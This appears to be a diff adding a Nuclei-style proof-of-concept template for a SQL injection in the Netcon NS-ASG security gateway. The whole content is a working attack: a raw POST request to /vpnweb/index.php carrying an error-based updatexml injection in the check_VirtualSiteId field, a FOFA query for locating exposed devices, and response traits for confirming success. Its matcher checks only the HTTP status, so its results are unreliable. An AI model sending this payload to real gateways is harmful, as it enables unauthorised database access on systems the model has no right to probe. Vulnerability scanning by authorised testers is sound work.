@@ -1,0 +1,60 @@
+id: poc-wamkbzcugnxzbh93
+info:
+  name: 网康应用安全网关(NS-ASG) SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wamkbzcugnxzbh93'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wamkbzcugnxzbh93
+    fofa: title:"网康-NS-ASG-应用安全网关"
+http:
+- raw:
+  - 'POST /vpnweb/index.php?para=index HTTP/1.1
+
+
+    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
+
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+
+
+    check_username=123&check_username1=123&check_passwd=123&action=login_check&check_VirtualSiteId=1/**/and/**/updatexml(1,concat(0x7e,(md5(123))),3)#&imgcode=undefined&selvalue=2&BackgroundName=background.gif
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    202cb962ac59075b9
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
